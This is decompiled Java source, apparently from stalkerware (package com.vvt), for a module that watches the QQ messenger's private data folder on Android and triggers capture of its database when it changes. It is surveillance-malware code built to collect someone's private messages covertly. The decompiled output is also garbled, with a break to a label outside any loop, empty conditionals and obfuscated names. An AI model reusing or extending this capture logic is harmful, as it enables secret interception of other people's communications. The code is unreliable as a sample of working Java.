package com.vvt.capture.qq.b;

import com.vvt.base.capture.e;
import com.vvt.base.capture.i;
import com.vvt.n.a.g;

public class b
  implements e, com.vvt.n.a.a, g
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private i c;
  private com.vvt.n.a.b d;
  private boolean e;
  private String f;
  private String g;
  
  public b(com.vvt.n.a.b paramb, String paramString1, String paramString2)
  {
    this.d = paramb;
    this.f = paramString1;
    this.e = false;
    this.g = paramString2;
  }
  
  public void a(i parami)
  {
    boolean bool1 = true;
    boolean bool2 = a;
    if (bool2) {}
    bool2 = this.e;
    if (!bool2)
    {
      this.e = bool1;
      this.c = parami;
      Object localObject1 = this.d;
      if (localObject1 == null) {
        break label104;
      }
      int i = 2;
      Object localObject2 = new Object[i];
      String str1 = "/data/data";
      localObject2[0] = str1;
      String str2 = "com.tencent.mobileqq";
      localObject2[bool1] = str2;
      localObject1 = String.format("%s/%s", (Object[])localObject2);
      localObject2 = this.d;
      ((com.vvt.n.a.b)localObject2).a((String)localObject1, this);
    }
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      return;
      label104:
      bool2 = b;
      if (!bool2) {}
    }
  }
  
  public void a(String paramString)
  {
    boolean bool = a;
    if (bool) {}
    Object localObject = com.vvt.n.a.d.a.a();
    if (localObject != null)
    {
      String str1 = a.a(this.f);
      String str2 = this.f;
      String str3 = this.g;
      localObject = a.a((String)localObject, str1, str2, str3);
      bool = com.vvt.ag.b.a((String)localObject);
      if (!bool)
      {
        bool = a;
        if (bool) {}
        localObject = this.c;
        ((i)localObject).a();
      }
    }
    bool = a;
    if (bool) {}
  }
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
    bool = this.e;
    if (bool)
    {
      this.e = false;
      bool = false;
      this.c = null;
      Object localObject = this.d;
      if (localObject != null)
      {
        localObject = com.vvt.n.a.d.a.a();
        com.vvt.n.a.b localb = this.d;
        localb.a((String)localObject);
      }
    }
    bool = a;
    if (bool) {}
  }
  
  public void b(String paramString)
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
    String str = com.vvt.n.a.d.a.a();
    boolean bool2 = a;
    if (bool2) {}
    bool2 = com.vvt.ag.b.a(str);
    if (!bool2)
    {
      this.d.a(paramString);
      com.vvt.n.a.b localb = this.d;
      localb.a(str, this);
    }
    bool1 = a;
    if (bool1) {}
  }
  
  public void c(String paramString) {}
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/qq/removeFromPath/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */